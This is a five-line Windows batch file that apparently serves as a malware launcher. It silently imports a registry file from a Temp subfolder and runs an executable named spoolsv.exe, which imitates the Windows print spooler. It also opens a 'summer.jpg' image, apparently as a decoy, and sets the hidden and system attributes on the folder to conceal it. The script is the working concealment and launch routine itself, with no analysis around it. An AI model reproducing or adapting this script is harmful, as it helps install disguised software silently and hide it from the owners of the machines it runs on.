@ECHO OFF
START regedit /s %SystemRoot%\Temp\spoolsv\a.reg
START %SystemRoot%\temp\spoolsv\spoolsv.exe
START %SystemRoot%\temp\spoolsv\summer.jpg
START attrib +H +S %SystemRoot%\temp\spoolsv